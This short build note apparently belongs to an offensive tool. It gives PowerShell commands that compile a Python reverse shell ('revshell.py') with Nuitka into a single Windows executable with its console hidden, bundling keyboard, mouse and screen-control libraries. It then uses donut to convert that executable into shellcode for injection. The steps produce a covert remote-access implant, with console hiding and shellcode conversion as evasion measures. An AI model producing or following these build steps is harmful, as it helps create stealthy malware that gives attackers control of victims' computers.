To build the executable from the reverse shell:
```ps1
python -m nuitka --msvc=14.3 `
    --onefile `
    --windows-disable-console `
    --include-package=ctypes `
    --include-package=pyautogui `
    --include-package=numpy `
    --include-package=requests `
    --include-package=pynput `
    --enable-plugin=numpy `
    --enable-plugin=tk-inter `
    --include-package-data=pyautogui `
    revshell.py
```

donut : 

```
./donut.exe -i revshell_nuitka.exe -f 1 -a 2 -o revshell.bin
```